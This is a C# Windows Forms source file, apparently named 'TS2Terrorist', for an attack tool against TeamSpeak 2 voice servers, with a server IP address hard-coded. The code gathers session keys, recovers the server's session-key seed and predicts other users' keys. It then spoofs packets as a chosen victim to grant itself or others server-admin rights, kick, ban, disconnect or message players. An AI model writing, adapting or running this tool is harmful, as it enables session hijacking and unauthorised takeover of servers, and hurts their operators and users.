using AltarNet;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using System.Numerics;

namespace TS2Terrorist
{
    public partial class Form1 : Form
    {
        public uint SequenceNumber = 0;
        public uint PingSequenceNumber = 1;
        public uint SessionKey = 0;
        public uint ClientID = 0;
        public uint RealClientID = 0;
        UdpHandler net;
        const string IP = "54.201.47.114";
        const int PORT = 8767;
        IPEndPoint Target;
        List<Player> Players = new List<Player>();
        Thread pingThread = null;
        List<int> RemoveQueue = new List<int>();
        List<uint> Sessions = new List<uint>();
        List<uint> ClientIDs = new List<uint>();
        List<uint> GeneratedSessions = new List<uint>();
        SessionList sessionList = null;
        public bool disconnectPending = false;
        public uint dcSequenceNumber = 0;
        public uint spoofSequenceNumber = 999;
        public Object lockObject = new Object();

        /* actions */
        const int ACT_GRANT_SA = 1;
        const int ACT_REVOKE_SA = 2;
        const int ACT_DISCONNECT = 3;
        const int ACT_KICK = 4;
        const int ACT_BAN = 5;
        const int ACT_SEND_MESSAGE_PLAYER = 6;
        const int ACT_SEND_MESSAGE_ALL = 7;
        const int ACT_REGISTER = 8;

        // That's our custom TextWriter class
        TextWriter _writer = null;
        private uint RealSessionKey;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Instantiate the writer
            //_writer = new TextBoxStreamWriter(txtConsole);
            // Redirect the out Console stream
            //Console.SetOut(_writer);
        }

        private void init()
        {
            this.SequenceNumber = 0;
            Login();
        }

        private void net_Received(object sender, UdpPacketReceivedEventArgs e) 
        {
            TS2Packet packet = new TS2Packet();
            packet.ReadPacket(e.Response.Buffer);
            ClientID = packet.ClientID;
            RealClientID = packet.ClientID;
            Stream stream = null;
            BinaryReader reader = null;
            try
            {
                if (packet.Data == null)
                {
                    packet.Data = new byte[] { 0x00 };
                }
                stream = new MemoryStream(packet.Data);
                reader = new BinaryReader(stream);
            }
            catch (Exception err)
            {
            }
            switch (packet.Class)
            {
                case TS2.CONNECTION:
                    switch (packet.Type)
                    {
                        case TS2.LOGINREPLY:
                            LoginHandler(reader);
                            break;
                        case TS2.PING_REPLY:
                            PingSequenceNumber = packet.SequenceNumber+1;
                            break;
                        default:
                            Console.WriteLine("Unhandled Packet Type");
                            break;
                    }
                    break;

                case TS2.STANDARD:
                    switch (packet.Type)
                    {
                        case TS2.PLAYERLIST:
                            PlayerListHandler(reader);
                            break;
                        case TS2.CHANNELLIST:
                            if (pingThread == null)
                            {
                                pingThread = new Thread(new ThreadStart(PingThread));
                                pingThread.Start();
                            }
                            break;
                        case TS2.NEWPLAYER:
                            NewPlayerHandler(reader);
                            break;
                        case TS2.PLAYERQUIT:
                            Console.WriteLine("Player left!");
                            PlayerQuitHandler(reader);
                            break;
                        default:
                            break;
                    }
                    AckHandler(packet.SequenceNumber);
                    break;

                case TS2.ACK:
                    if (disconnectPending)
                    {
                        if (packet.SequenceNumber == this.dcSequenceNumber)
                        {
                            disconnectPending = false;
                        }
                    }
                    AckHandler(packet.SequenceNumber);
                    this.SequenceNumber = packet.SequenceNumber + 1;
                    break;

                default:
                    Console.WriteLine("Unknown Packet");
                    break;
            }
        }

        public void AckHandler( uint SequenceNumber )
        {
            TS2Packet packet = new TS2Packet();
            packet.Create(TS2.ACK, 0x0000, SessionKey, RealClientID, SequenceNumber);
            packet.Raw(new byte[] { 0x00 });
            net.Send(packet.toByteArray(), Target);
        }

        public void Register()
        {
            TS2Packet packet = new TS2Packet();
            packet.Create(TS2.STANDARD, TS2.REGISTER, this.SessionKey, this.ClientID, this.SequenceNumber);
            packet.Register(txtUsername.Text, txtPassword.Text);
            net.Send(packet.toByteArray(), Target);
        }

        public void PingThread()
        {
            while (true)
            {
                Ping(PingSequenceNumber);
                Thread.Sleep(1000);
                Console.WriteLine("Pung");
            }
        }

        public void Ping(uint SequenceNumber)
        {
            TS2Packet packet = new TS2Packet();
            packet.Create(TS2.CONNECTION, TS2.PING, RealSessionKey, RealClientID, PingSequenceNumber++);
            packet.Raw(new byte[] {});
            try
            {
                net.Send(packet.toByteArray(), Target);
            }
            catch (ObjectDisposedException ex)
            {
                net.Dispose();
                Console.WriteLine(ex.Message + "\r\n" + ex.StackTrace);
                init();
            }
        }

        public void PlayerQuitHandler(BinaryReader reader)
        {
            uint PlayerID = reader.ReadUInt32();
            int idx = 0;
            foreach (Player p in Players)
            {
                if (p.PlayerID == PlayerID)
                {
                    Players.RemoveAt(idx);
                    break;
                }
                idx++;
            }
            UpdatePlayers();
        }

        public void NewPlayerHandler(BinaryReader reader)
        {
            uint PlayerID = reader.ReadUInt32();
            uint ChannelID = reader.ReadUInt32();
            uint Unknown = reader.ReadUInt32();
            ushort Flags = reader.ReadUInt16();
            string Nickname = reader.ReadString();
            if (getPlayerByID(PlayerID).PlayerID == 0)
            {
                lock (lockObject)
                {
                    Player p = new Player(PlayerID, ChannelID, Unknown, Flags, Nickname, 0x00);
                    Players.Add(p);
                }
            }
            UpdatePlayers();
        }

        public void UpdatePlayers()
        {
            lock (lockObject)
            {
                Console.WriteLine("Players: {0}", Players.Count);

                srcPlayer.Items.Clear();
                dstPlayer.Items.Clear();
                playersTable.Rows.Clear();
                DataGridViewRow row;
                int idx = 0;
                foreach (Player p in Players)
                {
                    row = (DataGridViewRow)playersTable.Rows[0].Clone();
                    row.Cells[0].Value = p.PlayerID.ToString();
                    row.Cells[1].Value = p.Nickname;
                    row.Cells[2].Value = (GeneratedSessions.Count > p.PlayerID)
                        ? BitConverter.ToString(BitConverter.GetBytes(GeneratedSessions[(int)p.PlayerID]))
                        : "";

                    playersTable.Rows.Add(row);

                    srcPlayer.Items.Add(p.Nickname);
                    dstPlayer.Items.Add(p.Nickname);

                    Players[idx].SessionKey = (GeneratedSessions.Count > p.PlayerID)
                        ? GeneratedSessions[(int)p.PlayerID]
                        : 0;

                    idx++;
                }
            }
        }

        public void PrintPlayers()
        {
            foreach (Player p in Players)
            {
                Console.WriteLine("[{0}] {1}", p.PlayerID, p.Nickname);
            }
        }

        public void PlayerListHandler(BinaryReader reader)
        {
            uint numberOfPlayers = reader.ReadUInt32();
            for (uint i = 0; i < numberOfPlayers; i++)
            {
                uint PlayerID = reader.ReadUInt32();
                uint ChannelID = reader.ReadUInt32();
                uint Unknown = reader.ReadUInt32();
                ushort Flags = reader.ReadUInt16();
                string Nickname = reader.ReadString();
                if (getPlayerByID(PlayerID).PlayerID == 0)
                {
                    lock (lockObject)
                    {
                        Player player = new Player(
                            PlayerID,
                            ChannelID,
                            Unknown,
                            Flags,
                            Nickname,
                            0
                        );
                        Players.Add(player);
                    }
                }
                reader.BaseStream.Seek(29 - Nickname.Length, SeekOrigin.Current);
            }
            UpdatePlayers();
        }

        public void ChannelListHandler(BinaryReader reader)
        {
        }

        public Player getPlayerByName(string Nickname)
        {
            foreach (Player p in Players)
            {
                if (p.Nickname.Equals(Nickname))
                {
                    return p;
                }
            }
            return new Player(0, 0, 0, 0, "", 0x00);
        }

        public Player getPlayerByID(uint PlayerID)
        {
            foreach (Player p in Players)
            {
                if (p.PlayerID.Equals(PlayerID))
                {
                    return p;
                }
            }
            return new Player(0, 0, 0, 0, "", 0x00);
        }

        public void LoginHandler(BinaryReader reader)
        {
            Console.WriteLine("Login Handler Called");
            reader.BaseStream.Seek(68, SeekOrigin.Begin);
            int response = reader.ReadInt32();
            if (response < 1)
            {
                /*
                 * IDK
                 f4be0400000000009100000002000000650f24671d01010101010101010101010101010101010101010101015075626c6963054c696e757800000000000000000000000000000000000000000000000002000000180001000100000000140000000000000600061ef60ffefffc7e01fe0000000000e06f7c3e00f40000000000000000000094000000000000000000009400040000024a000000009400000000024a000000021400e8030000e5934300910000008357656c636f6d6520746f20587472656d65205465616d20436f6d6d756e69636174696f6e73205075626c6963205473322120506c656173652072656164202d3d53657276657220496e666f3d2d206368616e6e656c2e20506c65617365207573652078746374732e6e65743a383736372061732073657276657220616464726573732e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
                 * Invalid Login
                 f4be04000000000014000000020000004fc604270000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000faffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009de7bc001400000027596f757220495020686173206265656e2062616e6e656420666f72203130204d696e7574657321000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
                 Banned = -6
                 * 
                 */
                switch (response)
                {
                    case -6:
                        Console.WriteLine("You have been banned.");
                        break;
                    case -7:
                        Console.WriteLine("User already logged in.");
                        break;
                    case -21:
                    default:
                        Console.WriteLine("Invalid Login: {0}", response.ToString());
                        break;
                }
            }
            else
            {
                /*
                 * Valid Login
                 f4be0400000000002700000002000000081077fc105465616d537065616b2053657276657200000000000000000000000000054c696e7578000000000000000000000000000000000000000000000000020000001800010001000000ff1f000000000000050007ffff0ffefffeff03fe0000000000e07f7c3e00d40000000000006c502800d4000000000000000000009400040000004e000000009000040000004a0000000090001000000024ad8c0027000000315b57656c636f6d6520746f205465616d537065616b2c20636865636b207777772e676f7465616d737065616b2e636f6d5d0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
                 */

                /* Reset the stream */
                reader.BaseStream.Seek(0, SeekOrigin.Begin);
                string serverName = reader.ReadString();
                reader.BaseStream.Seek(29 - serverName.Length, SeekOrigin.Current);
                string serverPlatform = reader.ReadString();
                reader.BaseStream.Seek(121 - serverPlatform.Length, SeekOrigin.Current);
                SessionKey = reader.ReadUInt32();
                RealSessionKey = SessionKey;
                reader.BaseStream.Seek(4, SeekOrigin.Current);
                string serverWelcomeString = "";
                try
                {
                    serverWelcomeString = reader.ReadString();
                }
                catch (Exception ex1)
                {
                }
                Console.WriteLine("Login Success! - {0} on {1}\r\nSession Key: {2}\r\nClient ID: {3}\r\n{4}", serverName, serverPlatform, SessionKey, ClientID, serverWelcomeString);

                btnConnect.Enabled = false;

                if (this.Sessions.Count < 2)
                {
                    this.Sessions.Add(SessionKey);
                    this.ClientIDs.Add(ClientID);
                    Disconnect();
                    new Thread(new ThreadStart(WaitForDisconnect)).Start();
                }
                else
                {
                    new Thread(new ThreadStart(FindSession)).Start();
                    JoinServer();
                }
            }
        }

        public void FindSession()
        {
            sessionList = new SessionList(this.ClientIDs[0], this.Sessions[0], this.Sessions[1]);
            sessionList.getSeed(1);
            //sessionList.seed = 1833297342;

            Invoke(new MethodInvoker(SetSessionFound));
        }

        public void SetSessionFound()
        {
            lblSeed.Text = "Seed found!";
            lblSeed.ForeColor = Color.LightGreen;
            uint last = sessionList.seed;
            GeneratedSessions.Add(sessionList.gen_session(last));

            for (int i = 1; i < 9999; i++)
            {
                last = sessionList.gen_x(last);
                GeneratedSessions.Add(sessionList.gen_session(last));
            }
            UpdatePlayers();
        }

        public void WaitForDisconnect()
        {
            while (disconnectPending)
            {
                Thread.Sleep(100);
            }

            Thread.Sleep(5000);
            Invoke(new MethodInvoker(init));
        }

        public void Login()
        {
            TS2Packet packet = new TS2Packet();
            packet.Create(TS2.CONNECTION, TS2.LOGIN, 0x00000000, 0x00000000, SequenceNumber++);
            packet.Login(txtNickname.Text, txtUsername.Text, (string.IsNullOrEmpty(txtPassword.Text) ? txtServerPassword.Text : txtPassword.Text), txtPlatform.Text, txtOS.Text);
            net.Send(packet.toByteArray(), Target);
        }

        public void JoinServer()
        {
            TS2Packet packet = new TS2Packet();
            packet.Create(TS2.STANDARD, TS2.LOGIN2, SessionKey, ClientID, SequenceNumber);
            packet.Raw(
                new byte[] {
                    0x01, 0x00, 0x00, 0x00, 0xf4, 0x3b, 0x46, 0x75, 0x3b, 0x6d, 0x92, 0x8a, 0x7c, 0xf8, 
                    0x18, 0x00, 0xb4, 0xc4, 0x48, 0x00, 0x02, 0x00, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 
                    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                    0x00, 0x00, 0x00, 0x00, 0xe0, 0x5e, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7c, 0xf8, 
                    0x18, 0x00, 0xb4, 0xc4, 0x48, 0x00, 0x7c, 0xf8, 0x18, 0x00, 0xb4, 0xc4, 0x48, 0x00, 
                    0xfc, 0x9a, 0xb6, 0x02, 0xa6, 0x9f, 0x92, 0xd6, 0x00, 0x00, 0x00, 0x00
                }
            );
            net.Send(packet.toByteArray(), Target);
            Console.WriteLine("Sent LOGIN2");
        }

        public void GrantSA(uint cid)
        {
            ServerAdmin(cid, true);
        }

        public void RevokeSA(uint cid)
        {
            ServerAdmin(cid, false);
        }

        public void ServerAdmin(uint cid, bool give)
        {
            /* f0be3301a54c3d003f00000002000000000000005f718a7e0e0000000000 */
            /* f0be3301ce8f36003f000000020000000000000006ef023b0e0000000000 */
            /* f0be3301ffe32500450000000200000000000000630e5b4c0e0000000200 */
            TS2Packet packet = new TS2Packet();
            ushort action = give ? (ushort)0x0000 : (ushort)0x0002;
            packet.Create(TS2.STANDARD, TS2.GIVESA, this.SessionKey, this.ClientID, this.SequenceNumber);
            packet.Raw(packet.combine(BitConverter.GetBytes(cid), BitConverter.GetBytes(action)));
            net.Send(packet.toByteArray(), Target);
        }

        public void Disconnect()
        {
            TS2Packet packet = new TS2Packet();
            packet.Create(TS2.STANDARD, TS2.DISCONNECT, this.SessionKey, this.ClientID, this.SequenceNumber);
            packet.Raw(new byte[] { });
            net.Send(packet.toByteArray(), Target);

            disconnectPending = true;
            dcSequenceNumber = this.SequenceNumber;
        }

        public void Kick(uint cid, string message)
        {
            /* f0be4501577a75005b0000000200000000000000f8bd354f54000000000011596572206120747572642c20647564652e060000000d000000b870b602 */
            /*  */
            TS2Packet packet = new TS2Packet();
            packet.Create(TS2.STANDARD, TS2.KICKPLAYER, this.SessionKey, this.ClientID, this.SequenceNumber);
            packet.Raw(packet.combine(BitConverter.GetBytes(cid), new byte[] { 0x00, 0x00, (byte)message.Length }, packet.Pad(message, 29)));
            net.Send(packet.toByteArray(), Target);
        }

        public void Ban(uint cid, string message)
        {
            /* f0be4501577a75005b0000000200000000000000f8bd354f54000000000011596572206120747572642c20647564652e060000000d000000b870b602 */
            /*  */
            TS2Packet packet = new TS2Packet();
            packet.Create(TS2.STANDARD, TS2.BANPLAYER, this.SessionKey, this.ClientID, this.SequenceNumber);
            packet.Raw(packet.combine(BitConverter.GetBytes(cid), new byte[] { 0x00, 0x00, (byte)message.Length }, packet.Pad(message, 29)));
            net.Send(packet.toByteArray(), Target);
        }

        public void MessagePlayer(uint cid, string message)
        {
            SendMessage(cid, message, 2);            
        }

        public void MessageChannel(uint cid, string message)
        {
            SendMessage(cid, message, 1);
        }

        public void MessageServer(uint cid, string message)
        {
            SendMessage(cid, message, 0);
        }

        public void SendMessage(uint target, string message, int opt)
        {
            TS2Packet packet = new TS2Packet();
            packet.Create(TS2.STANDARD, TS2.MSGPLAYER, this.SessionKey, this.ClientID, this.SequenceNumber);

            switch (opt)
            {
                case 2: /* player */
                    packet.Raw(packet.combine(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x02 }, BitConverter.GetBytes(target), packet.Pad(message, message.Length + 1)));
                    break;
                case 1: /* channel */
                    packet.Raw(packet.combine(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x01 }, BitConverter.GetBytes(target), packet.Pad(message, message.Length + 1)));
                    break;
                case 0: /* server */
                    packet.Raw(packet.combine(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, packet.Pad(message, message.Length + 1)));
                    break;
            }

            net.Send(packet.toByteArray(), Target);
        }

        private void btnExecute_Click(object sender, EventArgs e)
        {
            if (dstPlayer.Text == null)
            {
                Console.WriteLine("Please select a destination player and action.");
                return;
            }

            bool spoof = (srcPlayer.Text != null && !string.IsNullOrEmpty(srcPlayer.Text.ToString()));
            Player source = null;

            if (spoof)
            {
                source = getPlayerByName(srcPlayer.Text.ToString());
            }
            Player target = getPlayerByName(dstPlayer.Text.ToString());

            Console.WriteLine("Source: {0} -> Target: {1}", source.Nickname, target.Nickname);

            uint self_id = this.ClientID;
            uint self_key = this.SessionKey;
            uint self_sequence = this.SequenceNumber;

            if (spoof)
            {
                this.ClientID = source.PlayerID;
                this.SessionKey = source.SessionKey;
                this.SequenceNumber = source.ActionSequenceNumber;
                source.ActionSequenceNumber++;
            }

            if (target.PlayerID != 0)
            {
                switch (action.SelectedIndex)
                {
                    case ACT_GRANT_SA:
                        Task.Factory.StartNew(() => Console.WriteLine("Giving SA to {0}", target.Nickname));
                        GrantSA(target.PlayerID);
                        //;
                        break;

                    case ACT_REVOKE_SA:
                        Task.Factory.StartNew(() => Console.WriteLine("Revoking SA from {0}", target.Nickname));
                        RevokeSA(target.PlayerID);
                        //;
                        break;

                    case ACT_DISCONNECT:
                        Task.Factory.StartNew(() => Console.WriteLine("Disconnecting {0}", target.Nickname));
                        Disconnect();
                        //;
                        break;

                    case ACT_KICK:
                        Task.Factory.StartNew(() => Console.WriteLine("Kicking {0}", target.Nickname));
                        Kick(target.PlayerID, txtMessage.Text.ToString());
                        break;

                    case ACT_BAN:
                        Task.Factory.StartNew(() => Console.WriteLine("Banning {0}", target.Nickname));
                        Ban(target.PlayerID, txtMessage.Text.ToString());
                        //;
                        break;

                    case ACT_SEND_MESSAGE_PLAYER:
                        Task.Factory.StartNew(() => Console.WriteLine("Sending message to {0}", target.Nickname));
                        MessagePlayer(target.PlayerID, txtMessage.Text.ToString());
                        //;
                        break;

                    case ACT_SEND_MESSAGE_ALL:
                        Task.Factory.StartNew(() => Console.WriteLine("Sending message to {0}", target.Nickname));
                        MessageServer(target.PlayerID, txtMessage.Text.ToString());
                        //;
                        break;

                    case ACT_REGISTER:
                        Task.Factory.StartNew(() => Console.WriteLine("Registering {0}:{1} with server...", txtUsername.Text, txtPassword.Text));
                        Register();
                        break;

                    default:
                        break;
                }
            }

            if (spoof)
            {
                this.ClientID = self_id;
                this.SessionKey = self_id;
                this.SequenceNumber = self_sequence;
            }

            UpdateSelectedPlayerSequence();
        }

        private void btnConnect_Click(object sender, EventArgs e)
        {
            try
            {
                Target = new IPEndPoint(IPAddress.Parse(txtIP.Text), int.Parse(txtPort.Text));
                Console.WriteLine("Connecting {0}:{1}", txtIP.Text, int.Parse(txtPort.Text));
                net = new UdpHandler(new IPEndPoint(IPAddress.Any, 54204));
                net.Listen(true);
                net.Received += net_Received;
                init();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Init: " + ex.Message + "\r\n" + ex.StackTrace);
            }
        }

        public void UpdateSelectedPlayerSequence()
        {
            bool spoof = (srcPlayer.Text != null && !string.IsNullOrEmpty(srcPlayer.Text.ToString()));
            Player source = null;

            if (spoof)
            {
                source = getPlayerByName(srcPlayer.Text.ToString());
                numSeq.Value = source.ActionSequenceNumber;
            }
        }

        private void srcPlayer_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateSelectedPlayerSequence();
        }

        private void numSeq_ValueChanged(object sender, EventArgs e)
        {
            bool spoof = (srcPlayer.Text != null && !string.IsNullOrEmpty(srcPlayer.Text.ToString()));
            Player source = null;

            if (spoof)
            {
                source = getPlayerByName(srcPlayer.Text.ToString());
                source.ActionSequenceNumber = uint.Parse(numSeq.Value.ToString());
            }
        }
    }
}
